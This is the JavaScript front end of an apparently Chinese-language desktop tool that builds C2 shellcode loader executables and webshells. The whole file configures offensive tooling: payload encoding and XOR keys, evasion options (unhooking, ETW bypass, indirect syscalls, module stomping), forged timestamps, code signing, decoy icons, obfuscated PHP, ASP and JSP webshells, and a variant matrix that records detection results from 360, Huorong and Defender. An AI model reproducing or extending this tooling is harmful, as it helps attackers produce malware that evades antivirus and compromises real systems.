/* ==========================================================================
   app.js —— 业务逻辑：C2 构建 / 变体矩阵 / Webshell / 产物自审 / 配置方案
   纯外壳交互（视图路由、主题、边栏）在 shell.js
   ========================================================================== */
const { invoke } = window.__TAURI__.core;

const $ = (id) => document.getElementById(id);
const logEl = $("log");

/* ---------- 日志着色 ---------- */
const esc = (s) =>
  s.replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));

function lineClass(line) {
  if (/\[(ERROR|FATAL)\]/.test(line)) return "lv-err";
  if (/失败|无法|警告|已跳过|不像载荷|不一致/.test(line)) return "lv-warn";
  if (/^\[(\d+|R|E\d|T6|5c|10)\]|^\[2b\]|^\[4b\]|^\[4c\]|^\[keep\]/.test(line)) return "lv-step";
  if (/已生成|已同步|已还原|已屏蔽|下载完成|OK ->|时间戳 ->|已签名|strip 完成/.test(line)) return "lv-ok";
  if (/^===/.test(line)) return "lv-dim";
  return "";
}

function setLog(text) {
  const fragment = document.createDocumentFragment();
  String(text)
    .split("\n")
    .forEach((line, index) => {
      if (index) fragment.append("\n");
      const cls = lineClass(line);
      if (cls) {
        const span = document.createElement("span");
        span.className = cls;
        span.textContent = line;
        fragment.append(span);
      } else {
        fragment.append(line);
      }
    });
  logEl.replaceChildren(fragment);
  logEl.scrollTop = logEl.scrollHeight;
}

$("clearLogBtn").addEventListener("click", () => setLog("日志已清空。"));

/* 右侧日志抽屉 展开/收起 */
function setLogOpen(open) {
  const wasOpen = document.body.classList.contains("log-open");
  document.body.classList.toggle("log-open", open);
  $("drawerBtn").classList.toggle("is-open", open);
  $("drawerBtn").title = open ? "收起日志" : "编译日志";
  if (open && !wasOpen) logEl.scrollTop = logEl.scrollHeight;
}
$("drawerBtn").addEventListener("click", () =>
  setLogOpen(!document.body.classList.contains("log-open")));
$("toggleLogBtn").addEventListener("click", () => setLogOpen(false));

/* ---------- 环境自检 ---------- */
const ENV_DEPS = [
  ["x64", (e) => e.x64],
  ["x86", (e) => e.x86],
  ["windres", (e) => e.windres],
  ["openssl", (e) => e.openssl],
  ["osslsigncode", (e) => e.osslsigncode],
];

async function checkEnv() {
  try {
    const e = await invoke("check_env");
    $("envText").innerHTML = ENV_DEPS.map(([name, get]) => {
      const p = get(e) || "";
      const ok = p && !p.includes("未找到");
      return `<span class="dep ${ok ? "ok" : "miss"}" title="${esc(p)}">${name}</span>`;
    }).join("");
    const dot = document.querySelector(".dot");
    const ccOk = !e.x64.includes("未找到") || !e.x86.includes("未找到");
    if (!ccOk) dot.className = "dot bad";
    else if (ENV_DEPS.some(([, get]) => get(e).includes("未找到"))) dot.className = "dot warn";
    else dot.className = "dot ok";

    // 设置页里的明细
    const d = $("envDetail");
    if (d) {
      d.innerHTML = [...ENV_DEPS, ["brew", (x) => x.brew]]
        .map(([name, get]) => {
          const p = get(e) || "";
          const ok = p && !p.includes("未找到");
          return `<div class="envrow"><span class="envname">${name}</span>
            <span class="envpath mono ${ok ? "" : "miss"}">${esc(p)}</span></div>`;
        })
        .join("");
    }
  } catch (err) {
    $("envText").textContent = "环境检测失败";
  }
}

/* ---------- 文件/目录选择 ---------- */
document.querySelectorAll("[data-pick]").forEach((btn) => {
  btn.addEventListener("click", async () => {
    const kind = btn.dataset.pick;
    const target = btn.dataset.target;
    const p = await invoke("pick_file", { kind });
    if (!p) return;
    if (kind === "dir") {
      $(target).value = p;
      if (target === "listDir") refreshList();
    } else {
      $(target).value = p;
      if (target === "iconPath") setIcon(p, false);
      if (target === "decoyPath") setIcon("lib:pdf", true);
      if (target === "insPath") runInspect(p);
      if (target === "payload" && ($("outDir").value === "" || $("outName").value === "loader.exe")) {
        const dir = p.substring(0, p.lastIndexOf("/"));
        if ($("outDir").value === "") $("outDir").value = dir;
      }
    }
  });
});

function parseKey(v) {
  v = (v || "").trim();
  if (!v) return null;
  const n = v.toLowerCase().startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
  return Number.isFinite(n) ? n & 0xff : null;
}

/* ---------- 条件显示 ---------- */
$("loadMode").addEventListener("change", () => {
  $("urlRow").classList.toggle("hidden", $("loadMode").value !== "remote");
});
$("timeMode").addEventListener("change", () => {
  $("timeRow").classList.toggle("hidden", $("timeMode").value !== "custom");
});
$("wsKind").addEventListener("change", () => {
  $("wsHexRow").classList.toggle("hidden", $("wsKind").value !== "shellcode");
  // 换语言时同步可选载荷类型（ASP 不支持 shellcode；JSP 在 Linux 上要用 sh）
  syncWsKindOptions();
});

/// 语言 → 该语言支持的载荷类型。
/// ASP 经典：ChrW 受代码页影响，二进制不安全 → 不支持 shellcode
/// JSP：Linux Tomcat 上没有 cmd.exe → 提供 sh
function kindsFor(lang) {
  if (lang === "asp") return ["exec", "cmd", "eval"];
  if (lang === "jsp") return ["sh", "exec", "cmd", "eval", "shellcode"];
  return ["exec", "cmd", "eval", "shellcode"];
}

function syncWsKindOptions() {
  const lang = $("wsLang").value;
  const sel = $("wsKind");
  const cur = sel.value;
  const want = kindsFor(lang);
  sel.innerHTML = "";
  const LABEL = {
    sh: "/bin/sh 命令回显（Linux Tomcat）",
    exec: "命令执行（不回显）",
    cmd: "命令回显（Windows cmd.exe）",
    eval: "代码执行",
    shellcode: "Shellcode（十六进制）",
  };
  for (const k of want) {
    const o = document.createElement("option");
    o.value = k;
    o.textContent = LABEL[k] || k;
    sel.appendChild(o);
  }
  // 尽量保住原选择，不支持就退回第一个
  sel.value = want.includes(cur) ? cur : want[0];
  $("wsHexRow").classList.toggle("hidden", sel.value !== "shellcode");
}
$("wsLang").addEventListener("change", syncWsKindOptions);
syncWsKindOptions();

/// 免杀增强项：与后端 HARDEN_VALUES 一一对应（unhook|etw|indirect|stomp|diskssn）。
/// 之前这里是 `() => []` 的死桩 —— CLI 能用五项加固，GUI 却永远传空数组。
const HARDEN_ITEMS = [
  ["h_unhook", "unhook"],
  ["h_etw", "etw"],
  ["h_indirect", "indirect"],
  ["h_diskssn", "diskssn"],
  ["h_stomp", "stomp"],
];

function hardenList() {
  return HARDEN_ITEMS.filter(([id]) => $(id) && $(id).checked).map(([, v]) => v);
}

/// stomp 与 protect=auto / rwx 互斥（后端 generate.rs 会拒绝），
/// 这里提前禁用并警告，别让用户跑完一堆编译才看到报错。
function syncStompWarn() {
  const on = $("h_stomp") && $("h_stomp").checked;
  if ($("stompRow")) $("stompRow").classList.toggle("hidden", !on);
  const clash = on && $("protect").value !== "rx";
  if ($("stompWarn")) $("stompWarn").classList.toggle("hidden", !clash);
  return clash;
}
$("h_stomp").addEventListener("change", syncStompWarn);
$("protect").addEventListener("change", syncStompWarn);

/// TSA 输入框已从界面移除（占位），签名时固定用这个值
const DEFAULT_TSA = "http://tsa.wotrus.com";

/* ---------- 实测预设 ---------- */
const PRESETS = {
  std:       { encoding: "chunk", mode: "direct", protect: "rx",   obf: true, icon: "lib:notepad", res: true, anti: false },
  b32:       { encoding: "b32",   mode: "direct", protect: "rx",   obf: true, icon: "lib:notepad", res: true, anti: false },
  prot_auto: { encoding: "chunk", mode: "direct", protect: "auto", obf: true, icon: "lib:notepad", res: true, anti: false },
  prot_rwx:  { encoding: "chunk", mode: "direct", protect: "rwx",  obf: true, icon: "lib:notepad", res: true, anti: false },
};

function applyPreset(k) {
  const p = PRESETS[k];
  if (!p) return;
  $("encoding").value = p.encoding;
  $("mode").value = p.mode;
  $("protect").value = p.protect;
  $("h_obf").checked = p.obf;
  $("h_res").checked = p.res;
  $("h_anti").checked = p.anti;
  // 预设不指定增强项：全部复位，避免沿用上一轮的勾选把对照实验搞脏
  for (const [id] of HARDEN_ITEMS) $(id).checked = false;
  $("stompDll").value = "";
  pickedIcon = p.icon;
  $("iconPath").value = "";
  syncIconUI();
  syncEncWarn();
  syncModeWarn();
  if (typeof syncSummary === "function") syncSummary();
}

const KILLED_ENC = ["b64", "uuid", "chunk_r", "raw", "auto"];
const KILLED_MODE = ["fiber", "callback"];

function syncEncWarn() {
  const w = $("encWarn");
  if (w) w.classList.toggle("hidden", !KILLED_ENC.includes($("encoding").value));
}
function syncModeWarn() {
  const w = $("modeWarn");
  if (w) w.classList.toggle("hidden", !KILLED_MODE.includes($("mode").value));
}

$("preset").addEventListener("change", () => applyPreset($("preset").value));
$("encoding").addEventListener("change", syncEncWarn);
$("mode").addEventListener("change", syncModeWarn);

/* ---------- 底部配置摘要 ---------- */
const SUMMARY_FIELDS = [
  ["编码",   () => $("encoding").value,  (v) => KILLED_ENC.includes(v)],
  ["执行",   () => $("mode").value,      (v) => KILLED_MODE.includes(v)],
  ["保护",   () => $("protect").value.toUpperCase(), () => false],
  ["资源",   () => ($("h_res").checked ? "开" : "关"), (v) => v === "关"],
  ["签名",   () => ($("h_sign").checked ? "开" : "关"), () => false],
  ["增强",   () => {
    const h = hardenList();
    return h.length ? h.join("+") : "关";
  }, (v) => v !== "关"],
];

function syncSummary() {
  const el = $("summary");
  if (!el) return;
  el.innerHTML = SUMMARY_FIELDS.map(([label, get, bad]) => {
    const v = get();
    return `<span class="pill${bad(v) ? " warnp" : ""}">${label} <b>${esc(String(v))}</b></span>`;
  }).join("");
}

["encoding", "mode", "protect", "h_res", "h_sign"]
  .concat(HARDEN_ITEMS.map(([id]) => id))
  .forEach((id) => {
    const n = $(id);
    if (n) n.addEventListener("change", syncSummary);
  });
syncSummary();

/* ---------- 图标选择 ---------- */
let pickedIcon = "lib:notepad";

function syncIconUI() {
  document.querySelectorAll(".iconitem").forEach((el) => {
    el.classList.toggle("active", el.dataset.icon === pickedIcon);
  });
}

function setIcon(v, clearPath) {
  pickedIcon = v;
  if (clearPath) $("iconPath").value = "";
  syncIconUI();
}

async function buildIconGrid() {
  const grid = $("iconGrid");
  let names = [];
  try {
    names = await invoke("list_icons");
  } catch (_) {}
  for (const n of names) {
    const b = document.createElement("button");
    b.className = "iconitem";
    b.dataset.icon = "lib:" + n;
    b.title = n;
    b.innerHTML = `<img src="icons/${n}.png" alt="${n}" />`;
    b.addEventListener("click", () => setIcon("lib:" + n, true));
    grid.appendChild(b);
  }
  grid.querySelector('[data-icon=""]').addEventListener("click", () => setIcon("", true));
  $("iconPath").addEventListener("input", () => {
    const v = $("iconPath").value.trim();
    if (v) setIcon(v, false);
    else setIcon("", false);
  });
  syncIconUI();
}
buildIconGrid();
syncEncWarn();
syncModeWarn();

/* ---------- 收集当前配置 ---------- */
function collectOpts() {
  return {
    payload: $("payload").value.trim(),
    out_dir: $("outDir").value.trim(),
    out_name: $("outName").value.trim(),
    arch: $("arch").value,
    encoding: $("encoding").value,
    mode: $("mode").value,
    console: $("console").value === "console",
    xor_key: parseKey($("xorKey").value),
    load_mode: $("loadMode").value,
    remote_url: $("remoteUrl").value.trim(),
    time_mode: $("timeMode").value,
    time_value: $("timeValue").value,
    harden: hardenList(),
    stomp_dll: $("stompDll").value.trim(),
    anti_strict: !!$("h_anti") && $("h_anti").checked,
    res_full: $("h_res").checked,
    decoy: $("decoyPath").value.trim(),
    sign: $("h_sign").checked,
    tsa_url: DEFAULT_TSA,
    protect: $("protect").value,
    obfuscate: $("h_obf").checked,
    show_errors: $("h_msg").checked,
    icon: pickedIcon,
    cert_subject: $("certSubj").value.trim(),
  };
}

/* ---------- 生成 exe ---------- */
$("genBtn").addEventListener("click", async () => {
  const opts = collectOpts();
  if (!opts.payload) {
    setLog("[ERROR] 请先选择 payload 文件");
    return;
  }
  if (opts.load_mode === "remote" && !opts.remote_url) {
    setLog("[ERROR] 远程模式必须填写载荷 URL");
    return;
  }
  if (opts.time_mode === "custom" && !opts.time_value) {
    setLog("[ERROR] 请填写要伪造的时间");
    return;
  }
  if (syncStompWarn()) {
    setLog(
      "[ERROR] stomp 与 protect=" +
        opts.protect +
        " 互斥：模块踩踏会改写已签名 DLL 的页面属性，请把内存保护改回「仅 RX」或关闭 stomp"
    );
    setLogOpen(true);
    return;
  }
  const btn = $("genBtn");
  btn.disabled = true;
  btn.textContent = "编译中…";
  $("result").className = "result hidden";
  setLog("正在生成…");

  try {
    const r = await invoke("generate", { opts });
    setLog(r.log);
    const res = $("result");
    if (r.ok) {
      res.className = "result ok";
      let extra = "";
      if (r.payload_file) extra += ` ｜ 待上传载荷: ${r.payload_file.split("/").pop()}`;
      if (r.time_ts) extra += " ｜ 时间戳已改写";
      res.textContent = `✔ 生成成功: ${r.output.split("/").pop()}  (${r.size} bytes, key=0x${r.key
        .toString(16)
        .padStart(2, "0")}${r.uuid_count ? ", UUID×" + r.uuid_count : ""})${extra}`;
      $("listDir").value = r.output.substring(0, r.output.lastIndexOf("/"));
      refreshList();
      // 生成完顺手把自审页的路径填好，用户切过去就能看
      $("insPath").value = r.output;
    } else {
      res.className = "result bad";
      res.textContent = "✘ 生成失败，详见日志";
    }
    res.classList.remove("hidden");
    setLogOpen(true);
  } catch (err) {
    setLog("[ERROR] " + err);
  } finally {
    btn.disabled = false;
    btn.textContent = "生成 exe";
  }
});

/* ==========================================================================
   变体矩阵
   ========================================================================== */
let mxRows = [];

$("mxUseCurrent").addEventListener("click", () => {
  const o = collectOpts();
  $("mxBase").textContent =
    `enc=${o.encoding} · mode=${o.mode} · protect=${o.protect} · ` +
    `obf=${o.obfuscate ? "开" : "关"} · icon=${o.icon || "(无)"} · res=${o.res_full ? "开" : "关"}`;
  // 顺带把 C2 页的 payload / 输出目录带过来，方便直接开跑
  if (o.payload && !$("mxPayload").value) $("mxPayload").value = o.payload;
  if (o.out_dir && !$("mxDir").value) $("mxDir").value = o.out_dir;
});

/// 矩阵用的 opts：优先用矩阵页自己的 payload / 输出目录
function collectMatrixOpts() {
  const o = collectOpts();
  const p = $("mxPayload").value.trim();
  const d = $("mxDir").value.trim();
  if (p) o.payload = p;
  if (d) o.out_dir = d;
  return o;
}

function renderMatrix() {
  const tb = document.querySelector("#mxTable tbody");
  tb.innerHTML = "";
  const okN = mxRows.filter((r) => r.ok).length;
  $("mxCount").textContent = mxRows.length ? `${okN}/${mxRows.length} 成功` : "";
  $("mxEmpty").classList.toggle("hidden", mxRows.length > 0);

  for (const r of mxRows) {
    const tr = document.createElement("tr");
    if (!r.ok) tr.className = "mxfail";
    tr.innerHTML = `
      <td class="mxsuffix mono">${esc(r.suffix)}</td>
      <td class="mxdesc">${esc(r.desc)}</td>
      <td>${r.ok ? fmtSize(r.size) : "—"}</td>
      <td class="mono mxsha" title="${esc(r.sha256)}">${r.sha256 ? esc(r.sha256.slice(0, 10)) : "—"}</td>
      <td><input class="mxv" data-k="360" /></td>
      <td><input class="mxv" data-k="huorong" /></td>
      <td><input class="mxv" data-k="defender" /></td>
      <td class="act"><button class="ghost sm">显示</button></td>`;
    tr.querySelector("button").addEventListener("click", () => {
      if (r.output) invoke("reveal", { path: r.output });
      else setLog(`[矩阵] ${r.suffix}: ${r.error}`);
    });
    tb.appendChild(tr);
  }
}

$("mxBtn").addEventListener("click", async () => {
  const opts = collectMatrixOpts();
  if (!opts.payload) {
    setLog("[ERROR] 矩阵需要 payload，请在本页选择或点「沿用当前 C2 配置」");
    setLogOpen(true);
    return;
  }
  const btn = $("mxBtn");
  btn.disabled = true;
  btn.textContent = "生成中…";
  $("mxProg").classList.remove("hidden");
  mxRows = [];
  renderMatrix();

  try {
    const rows = await invoke("run_matrix", { opts });
    mxRows = rows || [];
    renderMatrix();
    setLog(
      `[矩阵] 完成 ${mxRows.filter((r) => r.ok).length}/${mxRows.length}\n` +
        mxRows.map((r) => `  ${r.ok ? "OK  " : "失败"} ${r.suffix.padEnd(14)} ${r.error || r.size + " bytes"}`).join("\n")
    );
    setLogOpen(true);
    $("listDir").value = opts.out_dir || ".";
    refreshList();
  } catch (err) {
    setLog("[ERROR] 矩阵生成失败: " + err);
    setLogOpen(true);
  } finally {
    btn.disabled = false;
    btn.textContent = "生成矩阵";
    $("mxProg").classList.add("hidden");
  }
});

// Rust 侧进度事件
if (window.__TAURI__.event && window.__TAURI__.event.listen) {
  window.__TAURI__.event.listen("matrix-progress", (e) => {
    const p = e.payload || {};
    if (p.phase === "row" && p.row) {
      $("mxStatus").textContent = `正在生成 ${p.row.suffix}（${p.step}/${p.total}）`;
      $("mxBar").style.width = (p.step / p.total) * 100 + "%";
      mxRows = mxRows.filter((r) => r.suffix !== p.row.suffix).concat(p.row);
      renderMatrix();
    } else if (p.phase === "done") {
      $("mxBar").style.width = "100%";
      $("mxStatus").textContent = "全部完成";
    }
  });
}

/* ==========================================================================
   Webshell 工作模式：生成新 / 混淆已有脚本
   ========================================================================== */
let wsMode = "gen";

function setWsMode(m) {
  wsMode = m;
  document.querySelectorAll("[data-wsmode]").forEach((b) =>
    b.classList.toggle("active", b.dataset.wsmode === m));
  $("wsPaneGen").classList.toggle("hidden", m !== "gen");
  $("wsPaneWrap").classList.toggle("hidden", m !== "wrap");
  // 顶栏按钮与提示文案跟着变
  $("wsBtn").textContent = m === "wrap" ? "开始混淆" : "生成 webshell";
  const h = $("wsModeHint");
  if (h) h.textContent = m === "wrap"
    ? "混淆你自己的脚本，保持原有功能不变"
    : "从零生成一个 webshell";
  syncWrapNote();
}
document.querySelectorAll("[data-wsmode]").forEach((b) => {
  b.addEventListener("click", () => setWsMode(b.dataset.wsmode));
});

/// 「整体编码」只有 PHP 支持（其它语言没有运行时 eval）
function wrapWholeSupported(lang) {
  return lang === "php";
}

function syncWrapNote() {
  const lang = $("wrapLang").value;
  const ok = wrapWholeSupported(lang);
  $("wrapWhole").disabled = !ok;
  const note = $("wrapNote");
  if (ok) {
    note.className = "wsnote";
    note.textContent = "PHP 支持整体编码：原文会被编码后运行时 eval，文件里看不到原始代码。";
  } else {
    note.className = "wsnote warn";
    note.textContent =
      "该语言不支持整体编码（无运行时 eval），将降级为「字符串变换」：" +
      "剥离注释 + 插入垃圾代码 + 混淆字符串字面量，语义与功能完全不变。";
  }
}
$("wrapLang").addEventListener("change", syncWrapNote);
syncWrapNote();

/* ==========================================================================
   矩阵子页切换（C2 / Webshell）
   ========================================================================== */
document.querySelectorAll(".mxtab").forEach((b) => {
  b.addEventListener("click", () => {
    document.querySelectorAll(".mxtab").forEach((x) => x.classList.toggle("active", x === b));
    const ws = b.dataset.mx === "ws";
    $("mxPaneC2").classList.toggle("hidden", ws);
    $("mxPaneWs").classList.toggle("hidden", !ws);
  });
});

/* ==========================================================================
   Webshell 矩阵
   ========================================================================== */
let mxWsRows = [];

function renderWsMatrix() {
  const tb = document.querySelector("#mxWsTable tbody");
  tb.innerHTML = "";
  const okN = mxWsRows.filter((r) => r.ok).length;
  $("mxWsCount").textContent = mxWsRows.length ? `${okN}/${mxWsRows.length} 成功` : "";
  $("mxWsEmpty").classList.toggle("hidden", mxWsRows.length > 0);
  for (const r of mxWsRows) {
    const tr = document.createElement("tr");
    if (!r.ok) tr.className = "mxfail";
    tr.innerHTML = `
      <td class="mxsuffix mono">${esc(r.suffix)}</td>
      <td class="mxdesc">${esc(r.desc)}</td>
      <td>${r.ok ? r.size + " B" : "—"}</td>
      <td class="mono mxsha" title="${esc(r.sha256)}">${r.sha256 ? esc(r.sha256.slice(0, 10)) : "—"}</td>
      <td><input class="mxv" data-k="360" /></td>
      <td><input class="mxv" data-k="huorong" /></td>
      <td><input class="mxv" data-k="defender" /></td>
      <td class="act"><button class="ghost sm">显示</button></td>`;
    tr.querySelector("button").addEventListener("click", () => {
      if (r.output) invoke("reveal", { path: r.output });
      else setLog(`[矩阵] ${r.suffix}: ${r.error}`);
    });
    tb.appendChild(tr);
  }
}

$("mxWsBtn").addEventListener("click", async () => {
  const opts = {
    lang: $("mxWsLang").value,
    password: $("wsPassword").value.trim() || "pass",
    payloadKind: $("wsKind").value,
    rawHex: $("wsHex").value.trim(),
    encodes: [...document.querySelectorAll("#wsEncChain input:checked")].map((i) => i.value),
    renameVars: $("wsRename").checked,
    junk: $("wsJunk").checked,
    splitStrings: $("wsSplit").checked,
    outDir: $("mxWsDir").value.trim(),
    outName: "wsmx",
  };
  const btn = $("mxWsBtn");
  btn.disabled = true;
  btn.textContent = "生成中…";
  mxWsRows = [];
  renderWsMatrix();
  try {
    const rows = await invoke("ws_matrix", { opts });
    mxWsRows = rows || [];
    renderWsMatrix();
    setLog(
      `[WS矩阵] 完成 ${mxWsRows.filter((r) => r.ok).length}/${mxWsRows.length}\n` +
        mxWsRows.map((r) => `  ${r.ok ? "OK  " : "失败"} ${r.suffix.padEnd(14)} ${r.error || r.size + " B"}  ${r.output.split("/").pop()}`).join("\n")
    );
    setLogOpen(true);
  } catch (err) {
    setLog("[ERROR] Webshell 矩阵失败: " + err);
    setLogOpen(true);
  } finally {
    btn.disabled = false;
    btn.textContent = "生成 Webshell 矩阵";
  }
});

/* ==========================================================================
   Webshell
   ========================================================================== */
$("wsBtn").addEventListener("click", async () => {
  if (wsMode === "wrap") return runWrap();
  const pw = $("wsPassword").value.trim();
  if (!pw) {
    setLog("[ERROR] 连接参数名不能为空");
    setLogOpen(true);
    return;
  }
  const enc = [...document.querySelectorAll("#wsEncChain input:checked")].map((i) => i.value);
  const opts = {
    lang: $("wsLang").value,
    password: pw,
    payloadKind: $("wsKind").value,
    rawHex: $("wsHex").value.trim(),
    encodes: enc,
    renameVars: $("wsRename").checked,
    junk: $("wsJunk").checked,
    splitStrings: $("wsSplit").checked,
    outDir: $("wsDir").value.trim(),
    outName: $("wsName").value.trim(),
  };
  const btn = $("wsBtn");
  btn.disabled = true;
  btn.textContent = "生成中…";
  try {
    const r = await invoke("ws_generate", { opts });
    setLog(r.log);
    $("wsPreview").textContent = r.ok ? r.code : "生成失败，详见日志";
    const res = $("result");
    res.className = r.ok ? "result ok" : "result bad";
    res.textContent = r.ok
      ? `✔ webshell 已生成: ${r.output.split("/").pop()} (${r.size} bytes, key=0x${r.key.toString(16).padStart(2, "0")})`
      : "✘ 生成失败，详见日志";
    res.classList.remove("hidden");
    setLogOpen(true);
  } catch (err) {
    setLog("[ERROR] " + err);
    setLogOpen(true);
  } finally {
    btn.disabled = false;
    btn.textContent = "生成 webshell";
  }
});

/* ==========================================================================
   混淆已有脚本（保功能）
   ========================================================================== */
async function runWrap() {
  const src = $("wrapSrc").value.trim();
  if (!src) {
    setLog("[ERROR] 请先选择要混淆的脚本文件");
    setLogOpen(true);
    return;
  }
  const opts = {
    lang: $("wrapLang").value,
    srcPath: src,
    encodes: [...document.querySelectorAll("#wsEncChain input:checked")].map((i) => i.value),
    encodeWhole: $("wrapWhole").checked && wrapWholeSupported($("wrapLang").value),
    renameVars: $("wrapRename").checked,
    junk: $("wrapJunk").checked,
    splitStrings: $("wrapSplit").checked,
    stripComments: $("wrapStrip").checked,
    outDir: $("wrapDir").value.trim(),
    outName: $("wrapName").value.trim(),
  };
  const btn = $("wsBtn");
  btn.disabled = true;
  btn.textContent = "混淆中…";
  try {
    const r = await invoke("ws_wrap", { opts });
    setLog(r.log);
    $("wrapPreview").textContent = r.ok ? r.code : "混淆失败，详见日志";
    const res = $("result");
    res.className = r.ok ? "result ok" : "result bad";
    res.textContent = r.ok
      ? `✔ 已混淆: ${r.output.split("/").pop()} (${r.src_size} → ${r.size} bytes, 模式: ${r.mode})`
      : "✘ 混淆失败，详见日志";
    res.classList.remove("hidden");
    setLogOpen(true);
  } catch (err) {
    setLog("[ERROR] " + err);
    setLogOpen(true);
  } finally {
    btn.disabled = false;
    btn.textContent = "开始混淆";
  }
}

/* ==========================================================================
   产物自审
   ========================================================================== */
async function runInspect(path) {
  if (!path) return;
  $("insBtn").disabled = true;
  try {
    const r = await invoke("inspect_exe", { path });
    $("insScore").textContent = r.score;
    $("insMeta").innerHTML = [
      ["文件", r.path.split("/").pop()],
      ["大小", fmtSize(r.size)],
      ["架构", `${r.machine} (${r.bits}bit)`],
      ["时间戳", r.timestamp],
      ["sha256", r.sha256.slice(0, 16) + "…"],
      ["签名", r.signed ? "有" : "无"],
      ["资源", r.has_resources ? "有" : "无"],
    ]
      .map(([k, v]) => `<div class="arow"><dt>${k}</dt><dd class="mono">${esc(String(v))}</dd></div>`)
      .join("");

    $("insList").innerHTML = r.findings
      .map((f) => {
        const mark = f.level === "pass" ? "ok" : f.level === "warn" ? "warn" : "bad";
        return `<li class="insitem ${mark}">
          <span class="institle">${esc(f.title)}</span>
          <span class="insdetail">${esc(f.detail)}</span>
          ${f.hint ? `<span class="inshint">↳ ${esc(f.hint)}</span>` : ""}
        </li>`;
      })
      .join("");
    $("insReport").classList.remove("hidden");
    $("insEmpty").classList.add("hidden");
  } catch (err) {
    setLog("[ERROR] 自审失败: " + err);
    setLogOpen(true);
  } finally {
    $("insBtn").disabled = false;
  }
}

$("insBtn").addEventListener("click", () => runInspect($("insPath").value.trim()));

/* ==========================================================================
   配置方案
   ========================================================================== */
async function refreshProfiles() {
  let list = [];
  try {
    list = await invoke("profile_list");
  } catch (_) {}
  const box = $("profList");
  if (!list.length) {
    box.innerHTML = `<span class="profnone">还没有保存的方案</span>`;
    return;
  }
  box.innerHTML = list
    .map(
      (p) => `<div class="profrow">
        <span class="profname">${esc(p.name)}</span>
        <span class="profmeta mono">${esc(p.opts.encoding || "")} / ${esc(p.opts.mode || "")}</span>
        <button class="ghost sm" data-load="${esc(p.name)}">载入</button>
        <button class="ghost sm danger" data-del="${esc(p.name)}">删除</button>
      </div>`
    )
    .join("");
  box.querySelectorAll("[data-load]").forEach((b) =>
    b.addEventListener("click", async () => {
      try {
        const o = await invoke("profile_load", { name: b.dataset.load });
        applyOpts(o);
        setLog(`[方案] 已载入「${b.dataset.load}」`);
      } catch (e) {
        setLog("[ERROR] 载入失败: " + e);
      }
    })
  );
  box.querySelectorAll("[data-del]").forEach((b) =>
    b.addEventListener("click", async () => {
      try {
        await invoke("profile_delete", { name: b.dataset.del });
        refreshProfiles();
      } catch (e) {
        setLog("[ERROR] 删除失败: " + e);
      }
    })
  );
}

/// 把一份 GenOpts 灌回界面
function applyOpts(o) {
  if (!o) return;
  const setv = (id, v) => {
    const el = $(id);
    if (el && v !== undefined && v !== null) el.value = v;
  };
  setv("payload", o.payload);
  setv("outDir", o.out_dir);
  setv("outName", o.out_name);
  setv("arch", o.arch);
  setv("encoding", o.encoding);
  setv("mode", o.mode);
  setv("protect", o.protect);
  setv("loadMode", o.load_mode);
  setv("remoteUrl", o.remote_url);
  setv("timeMode", o.time_mode);
  setv("timeValue", o.time_value);
  // TSA 界面已移除（见 index.html），固定用默认值
  setv("certSubj", o.cert_subject);
  setv("console", o.console ? "console" : "gui");
  $("h_obf").checked = !!o.obfuscate;
  $("h_res").checked = !!o.res_full;
  $("h_sign").checked = !!o.sign;
  $("h_anti").checked = !!o.anti_strict;
  // 免杀增强：回填方案里存的勾选项（老方案没有该字段时全不勾）
  const hs = Array.isArray(o.harden) ? o.harden : [];
  for (const [id, v] of HARDEN_ITEMS) $(id).checked = hs.includes(v);
  if (o.stomp_dll !== undefined && o.stomp_dll !== null) $("stompDll").value = o.stomp_dll;
  syncStompWarn();
  if (o.icon !== undefined) {
    pickedIcon = o.icon;
    $("iconPath").value = o.icon.startsWith("lib:") ? "" : o.icon;
    syncIconUI();
  }
  $("urlRow").classList.toggle("hidden", $("loadMode").value !== "remote");
  $("timeRow").classList.toggle("hidden", $("timeMode").value !== "custom");
  syncEncWarn();
  syncModeWarn();
  syncSummary();
}

$("profSave").addEventListener("click", async () => {
  const name = $("profName").value.trim();
  if (!name) {
    setLog("[ERROR] 请先填方案名");
    setLogOpen(true);
    return;
  }
  try {
    const p = await invoke("profile_save", { name, opts: collectOpts() });
    setLog(`[方案] 已保存 → ${p}`);
    refreshProfiles();
  } catch (e) {
    setLog("[ERROR] 保存失败: " + e);
  }
});

/* ---------- 产物列表 ---------- */
async function refreshList() {
  const dir = $("listDir").value.trim();
  if (!dir) return;
  const rows = await invoke("list_dir", { dir });
  const tb = document.querySelector("#histTable tbody");
  tb.innerHTML = "";
  if (!rows.length) {
    tb.innerHTML = '<tr><td colspan="4" class="empty">该目录下没有 exe</td></tr>';
    return;
  }
  for (const f of rows) {
    const tr = document.createElement("tr");
    const t = f.mtime ? new Date(f.mtime * 1000).toLocaleString("zh-CN") : "-";
    tr.innerHTML = `<td class="name">${esc(f.name)}</td><td>${fmtSize(f.size)}</td><td>${t}</td>
      <td class="act"><button class="ghost">在 Finder 中显示</button></td>`;
    tr.querySelector("button").addEventListener("click", () => invoke("reveal", { path: f.path }));
    tb.appendChild(tr);
  }
}
const fmtSize = (n) => (n < 1024 ? n + " B" : (n / 1024).toFixed(1) + " KB");

$("refreshBtn").addEventListener("click", refreshList);
$("listDir").addEventListener("keydown", (e) => {
  if (e.key === "Enter") refreshList();
});

/* ---------- 启动 ---------- */
(async function boot() {
  checkEnv();
  refreshProfiles();
  try {
    $("abVer").textContent = await invoke("app_version");
  } catch (_) {}
  // 恢复上次配置（只填界面，不自动改路径以外的东西）
  try {
    const last = await invoke("last_opts");
    if (last && last.payload) applyOpts(last);
  } catch (_) {}
  $("mxUseCurrent").click();
})();
